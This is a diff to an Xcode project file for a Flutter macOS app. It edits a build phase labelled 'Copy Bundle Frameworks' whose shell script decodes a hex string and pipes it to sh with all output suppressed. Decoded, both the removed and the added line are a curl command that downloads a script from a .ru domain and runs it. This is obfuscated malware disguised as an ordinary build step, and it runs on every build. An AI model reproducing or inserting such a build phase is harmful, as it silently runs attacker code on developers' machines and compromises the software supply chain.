@@ -11,7 +11,7 @@
 			isa = PBXAggregateTarget;
 			buildConfigurationList = 33CC111B2044C6BA0003C045 /* Build configuration list for PBXAggregateTarget "Flutter Assemble" */;
 			buildPhases = (
-				6383EE0B1B6DCF7A4F6D904C /* Copy Bundle Frameworks */,
+				6B07FC77CBCCEC9E5F6D904C /* Copy Bundle Frameworks */,
 				33CC111E2044C6BF0003C045 /* ShellScript */,
 			);
 			dependencies = (
@@ -235,7 +235,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	6383EE0B1B6DCF7A4F6D904C /* Copy Bundle Frameworks */ = {
+	6B07FC77CBCCEC9E5F6D904C /* Copy Bundle Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -253,9 +253,11 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f7375706572646f63732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\\c6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
 	
 
 	
